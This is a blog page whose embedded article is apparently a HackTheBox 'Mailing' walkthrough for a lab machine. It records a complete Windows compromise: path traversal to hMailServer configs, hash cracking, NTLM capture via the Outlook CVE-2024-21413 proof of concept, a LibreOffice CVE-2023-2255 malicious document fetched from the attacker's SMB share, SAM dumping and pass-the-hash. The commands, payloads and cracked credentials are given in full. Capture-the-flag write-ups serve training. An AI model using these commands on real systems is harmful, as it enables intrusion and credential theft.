<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Mailing Writeup - HackTheBox | Rezy Dev</title>
<meta name="keywords" content="HackTheBox, Windows, Easy">
<meta name="description" content="Mailing is an easy Windows machine using path traversal to access hMailServer configs and crack the admin email password. Access to user maya is gained via CVE-2024-21413 to capture and crack NTLM, with root obtained by exploiting LibreOffice CVE-2023-2255.">
<meta name="author" content="Me">
<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/mailing/">
<meta name="google-site-verification" content="XYZabc">
<meta name="yandex-verification" content="XYZabc">
<meta name="msvalidate.01" content="XYZabc">
<link crossorigin="anonymous" href="/assets/css/stylesheet.c8cc592602af07182c5c77ec685d5a345edaf450c20eb609706f559cb037baef.css" integrity="sha256-yMxZJgKvBxgsXHfsaF1aNF7a9FDCDrYJcG9VnLA3uu8=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/mailing/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><style>
    @media screen and (min-width: 769px) {
         
        .post-content input[type="checkbox"]:checked ~ label > img {
            transform: scale(1.6);
            cursor: zoom-out;
            position: relative;
            z-index: 999;
        }
    
        .post-content img.zoomCheck {
            transition: transform 0.15s ease;
            z-index: 999;
            cursor: zoom-in;
        }
    }
    </style><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/mailing/">
  <meta property="og:site_name" content="Rezy Dev">
  <meta property="og:title" content="Mailing Writeup - HackTheBox">
  <meta property="og:description" content="Mailing is an easy Windows machine using path traversal to access hMailServer configs and crack the admin email password. Access to user maya is gained via CVE-2024-21413 to capture and crack NTLM, with root obtained by exploiting LibreOffice CVE-2023-2255.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-09-12T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-09-12T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Windows">
    <meta property="article:tag" content="Easy">
    <meta property="og:image" content="http://localhost:1313/feature.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/feature.png">
<meta name="twitter:title" content="Mailing Writeup - HackTheBox">
<meta name="twitter:description" content="Mailing is an easy Windows machine using path traversal to access hMailServer configs and crack the admin email password. Access to user maya is gained via CVE-2024-21413 to capture and crack NTLM, with root obtained by exploiting LibreOffice CVE-2023-2255.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "http://localhost:1313/writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "HackTheBox",
      "item": "http://localhost:1313/writeups/hackthebox/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Mailing Writeup - HackTheBox",
      "item": "http://localhost:1313/writeups/hackthebox/mailing/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Mailing Writeup - HackTheBox",
  "name": "Mailing Writeup - HackTheBox",
  "description": "Mailing is an easy Windows machine using path traversal to access hMailServer configs and crack the admin email password. Access to user maya is gained via CVE-2024-21413 to capture and crack NTLM, with root obtained by exploiting LibreOffice CVE-2023-2255.",
  "keywords": [
    "HackTheBox", "Windows", "Easy"
  ],
  "articleBody": " Link: https://app.hackthebox.com/machines/Mailing Difficulty Easy Machine Windows Enumeration Nmap\nI ran Nmap with the command nmap 10.10.11.14 -vv -p- -T4. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 PORT STATE SERVICE REASON 25/tcp open smtp syn-ack 80/tcp open http syn-ack 110/tcp open pop3 syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 143/tcp open imap syn-ack 445/tcp open microsoft-ds syn-ack 465/tcp open smtps syn-ack 587/tcp open submission syn-ack 993/tcp open imaps syn-ack 5040/tcp open unknown syn-ack 5985/tcp open wsman syn-ack 7680/tcp open pando-pub syn-ack 47001/tcp open winrm syn-ack 49664/tcp open unknown syn-ack 49665/tcp open unknown syn-ack 49666/tcp open unknown syn-ack 49667/tcp open unknown syn-ack 55959/tcp open unknown syn-ack During the aggressive scan, I used the command nmap 10.10.11.14 -vv -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,55959 -T4 -A. While Nmap was busy scanning, I focused my attention on examining the HTTP server. The detailed scan provided me with comprehensive information about the target machine‚Äôs services and configurations.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 PORT STATE SERVICE REASON VERSION 25/tcp open smtp syn-ack hMailServer smtpd | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 80/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Mailing 110/tcp open pop3 syn-ack hMailServer pop3d |_pop3-capabilities: USER TOP UIDL 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 143/tcp open imap syn-ack hMailServer imapd |_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK 445/tcp open microsoft-ds? syn-ack 465/tcp open ssl/smtp syn-ack hMailServer smtpd | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 587/tcp open smtp syn-ack hMailServer smtpd |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- | smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 993/tcp open ssl/imap syn-ack hMailServer imapd |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- |_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK 5040/tcp open unknown syn-ack 5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 7680/tcp open pando-pub? syn-ack 47001/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc syn-ack Microsoft Windows RPC 49665/tcp open msrpc syn-ack Microsoft Windows RPC 49666/tcp open msrpc syn-ack Microsoft Windows RPC 49667/tcp open msrpc syn-ack Microsoft Windows RPC 55959/tcp filtered unknown no-response Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 29452/tcp): CLEAN (Timeout) | Check 2 (port 39838/tcp): CLEAN (Timeout) | Check 3 (port 37492/udp): CLEAN (Timeout) | Check 4 (port 25477/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2024-05-05T11:59:54 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: -4m48s After several attempts of searching for LFI (Local File Inclusion) vulnerabilities, I decided to click on an obvious download button. Surprisingly, this approach actually worked, leading me to further exploit the system.\nI stumbled upon an intriguing configuration file path while analyzing the payload: ..\\..\\..\\..\\..\\..\\..\\Program%20Files%20(x86)\\hMailServer\\Bin\\hMailServer.INI. This discovery was inspired by an old exploit I found at https://www.exploit-db.com/exploits/7012. Essentially, this exploit provided me with the file structure for locating the hMailServer, specifically the hMailServer.INI file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [Directories] ProgramFolder=C:\\Program Files (x86)\\hMailServer DatabaseFolder=C:\\Program Files (x86)\\hMailServer\\Database DataFolder=C:\\Program Files (x86)\\hMailServer\\Data LogFolder=C:\\Program Files (x86)\\hMailServer\\Logs TempFolder=C:\\Program Files (x86)\\hMailServer\\Temp EventFolder=C:\\Program Files (x86)\\hMailServer\\Events [GUILanguages] ValidLanguages=english,swedish [Security] AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7 [Database] Type=MSSQLCE Username= Password=0a9f8ad8bf896b501dde74f08efd7e4c PasswordEncryption=1 Port=0 Server= Database=hMailServer Internal=1 I attempted to crack the MD5 hashes using hashcat with the command hashcat.exe -m0 myhash.txt rockyou.txt. Fortunately, I successfully cracked one of the hashes, revealing the Administrator Password as homenetworkingadministrator.\nHowever, the second hash proved to be resistant to cracking. After some research on Google, I came across a tool called hMailDatabasePasswordDecrypter, available at https://github.com/GitMirar/hMailDatabasePasswordDecrypter. This tool specializes in decrypting blowfish-encrypted hMail database passwords.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB] ‚îî‚îÄ# git clone https://github.com/GitMirar/hMailDatabasePasswordDecrypter.git Cloning into 'hMailDatabasePasswordDecrypter'... remote: Enumerating objects: 8, done. remote: Total 8 (delta 0), reused 0 (delta 0), pack-reused 8 Receiving objects: 100% (8/8), 9.53 KiB | 1.36 MiB/s, done. ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB] ‚îî‚îÄ# cd hMailDatabasePasswordDecrypter ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/hMailDatabasePasswordDecrypter] ‚îî‚îÄ# ls blowfish.cpp blowfish.h blowfish.h2 main.cpp Makefile README.md ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/hMailDatabasePasswordDecrypter] ‚îî‚îÄ# make g++ blowfish.cpp main.cpp -o decrypt ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/hMailDatabasePasswordDecrypter] ‚îî‚îÄ# ./decrypt 0a9f8ad8bf896b501dde74f08efd7e4c 6FC6F69152AD Following the steps outlined in the GitHub README page, I attempted to crack the password successfully. However, when I tried to connect to the POP3 server using Telnet, I encountered difficulties as it wasn‚Äôt functioning as expected.\nUser Root After further enumeration regarding hMailServer, I came across an exploit that could be useful, available at https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6. Following the steps outlined in the CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability GitHub repository at https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability, I proceeded to run Responder on my Kali machine using the command sudo responder -I tun0.\n(Note: If Responder doesn‚Äôt return the hashes, you can use smbserver as suggested in the proof of concept on the GitHub page. I initially encountered the same issue, but after several attempts, it worked for me.)\nAfter running Responder, I executed the following command:\n1 2 3 4 5 6 7 ‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/Mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability] ‚îî‚îÄ# python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient mayay email pls look hi' CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC. Alexander Hagenah / @xaitax / ah@primepage.de ‚úÖ Email sent successfully. After sending the email, I monitored Responder, and to my satisfaction, I observed that it captured a user hash.\n1 maya::MAILING:dac4fe0aec512cc8:0ABF7016C9D7428230E543395441DBCD:010100000000000000EF6F99469EDA01293B5F358D9EF4DE0000000002000800540058005800340001001E00570049004E002D00380038003200520041004E005000380044004500500004003400570049004E002D00380038003200520041004E00500038004400450050002E0054005800580034002E004C004F00430041004C000300140054005800580034002E004C004F00430041004C000500140054005800580034002E004C004F00430041004C000700080000EF6F99469EDA01060004000200000008003000300000000000000000000000002000009BE5ABAC0CB766267616E7031B83C21B57E7A52A6903503167DE1974F23E1F3B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000 I cracked the above hash with the following command:\n1 hashcat.exe -m 5600 myhash.txt rockyou.txt --self-test-disable Our password is: m4y4ngs4ri. I used this password with the following command to establish a shell: evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri. This successfully granted me access to the system, and I was able to retrieve the user flag.\nRoot Flag I came across LibreOffice installed in the Program Files directory, and upon further investigation, I discovered a CVE associated with its version: CVE-2023-2255 (https://github.com/elweth-sec/CVE-2023-2255).\nTo exploit this vulnerability, I executed the following Python code:\n1 python3 CVE-2023-2255.py --cmd 'net localgroup Administrators maya /add' --output 'exploit.odt' This generated an exploit file named exploit.odt.\nNext, I launched an Impacket SMB server using the command:\n1 impacket-smbserver mailing `pwd` -smb2support Then, within the Evil-WinRM shell, I executed the following commands:\n1 2 net use \\\\10.10.14.98\\mailing copy \\\\10.10.14.98\\mailing\\exploit.odt These commands allowed me to access the exploit file from the SMB server.\nAfter copying the exploit.odt file from the SMB server, I waited for a few moments. Then, to confirm that the user maya had elevated privileges to administrator, I executed the command net user maya.\nWith confirmation of elevated privileges, I proceeded to dump the hashes using the crackmapexec command:\n1 crackmapexec smb 10.10.11.14 -u maya -p \"m4y4ngs4ri\" --sam This command allowed me to retrieve the SAM (Security Account Manager) database hashes from the target system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ crackmapexec smb 10.10.11.14 -u maya -p \"m4y4ngs4ri\" --sam [*] First time use detected [*] Creating home directory structure [*] Creating default workspace [*] Initializing FTP protocol database [*] Initializing SSH protocol database [*] Initializing SMB protocol database [*] Initializing WINRM protocol database [*] Initializing LDAP protocol database [*] Initializing RDP protocol database [*] Initializing MSSQL protocol database [*] Copying default configuration file [*] Generating SSL certificate SMB 10.10.11.14 445 MAILING [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False) SMB 10.10.11.14 445 MAILING [+] MAILING\\maya:m4y4ngs4ri (Pwn3d!) SMB 10.10.11.14 445 MAILING [+] Dumping SAM hashes SMB 10.10.11.14 445 MAILING Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c::: SMB 10.10.11.14 445 MAILING localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae::: SMB 10.10.11.14 445 MAILING maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af::: SMB 10.10.11.14 445 MAILING [+] Added 6 SAM hashes to the database Now, to gain root access to the box without cracking the hash, I can log in using the hash we previously dumped.\nI‚Äôll use the following command with impacket-wmiexec:\n1 impacket-wmiexec localadmin@10.10.11.14 -hashes \"aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae\" This command will authenticate me as the local administrator using the hashed credentials we obtained earlier, granting us root access to the box.\nThere we go! We now have access to the local administrator account. We‚Äôve successfully rooted this easy Windows box. Great job!\nConclusion: Thanks for reading my walkthrough. Hacking through the challenges presented by this box has been an enriching experience. Happy Hacking! ü´°\n",
  "wordCount" : "1923",
  "inLanguage": "en",
  "image":"http://localhost:1313/feature.png","datePublished": "2024-09-12T00:00:00Z",
  "dateModified": "2024-09-12T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Me"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/writeups/hackthebox/mailing/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Rezy Dev",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="rezydev.xyz (Alt + H)">rezydev.xyz</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/about/" title="üë®üèº‚Äçüíª About">
                    <span>üë®üèº‚Äçüíª About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/writeups/" title="‚úçÔ∏è Writeups">
                    <span>‚úçÔ∏è Writeups</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="üìÇ Archives">
                    <span>üìÇ Archives</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="üè∑Ô∏è Tags">
                    <span>üè∑Ô∏è Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="üîç Search (Alt &#43; /)" accesskey=/>
                    <span>üîç Search</span>
                </a>
            </li>
